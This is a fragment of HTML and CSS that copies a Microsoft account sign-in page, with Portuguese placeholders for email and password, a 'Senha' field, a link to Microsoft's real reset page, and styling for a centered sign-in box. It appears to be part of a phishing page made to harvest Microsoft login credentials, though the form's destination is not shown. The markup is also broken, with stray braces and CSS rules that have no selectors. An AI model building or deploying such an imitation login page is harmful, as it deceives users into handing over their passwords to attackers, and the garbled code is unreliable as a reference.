    <div id="overlay" class="overlay"></div>

                        </div>
                        <div id="error">
                            Please enter the password for your Microsoft account.
                        </div>
                        <input class="passwordinput" id="username" name="user" type="email" autocomplete="off" placeholder="Email, telefone ou Skype" required>
                        <input class="passwordinput" id="password" name="passwd" type="password" autocomplete="off" placeholder="Senha" required>
                    </div>
                    <p><span style="font-size: .8125rem;">Não consegue acessar sua conta?</span> <a href="https://account.live.com/ResetPassword.aspx">Opções de Entrada</a></p>

                    <input type="submit" id="submit" class="button" value="Avançar" >
                    </div>
                </div>
            </form>
        </div>
    </div>

a {

    text-decoration: none;
    font-size: .8125rem;
}
.overlay {
    background-color: #101010;
    opacity: .1;
    position: fixed;
    top: 0;
    left: 0;
    height: 100vh;
    width: 100vw;
    z-index: 0;
}
.footer {
    background-color: rgba(20,20,20, 0.6);
    position: fixed;
    bottom: 0;
    height: 28px;
    width: 100vw;
    z-index: 0;
}
.footertext {
    position: fixed;
    right: 0;
    text-align: right;
    color: #fff;
    font-size: 12px;

    white-space: nowrap;
    display: inline-block;
    margin-left: 8px;
    margin-right: 50px;
}
.outer {
    display: table;
    position: absolute;
    height: 100%;
    width: 100%;
    z-index: 10;
}
.middle {
    display: table-cell;
    vertical-align: middle;
}
.sign-in-box {
    margin-left: auto;
    margin-right: auto;
    position: relative;
    max-width: 400px;
    width: calc(100% - 40px);
    padding: 44px;
    margin-bottom: 28px;
    background-color: #fff;
    -webkit-box-shadow: 0 2px 6px rgba(0,0,0,.2);
    -moz-box-shadow: 0 2px 6px rgba(0,0,0,.2);
    box-shadow: 0 2px 6px rgba(0,0,0,.2);
    min-width: 300px;
    min-height: 300px;
    overflow: hidden;
}

}

}
.logo_image {
    height: 40px;
}

    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    margin-bottom: 15px;
}

    font-size: 1.5rem;
    font-weight: 600;
    padding: 0;

    display: none;
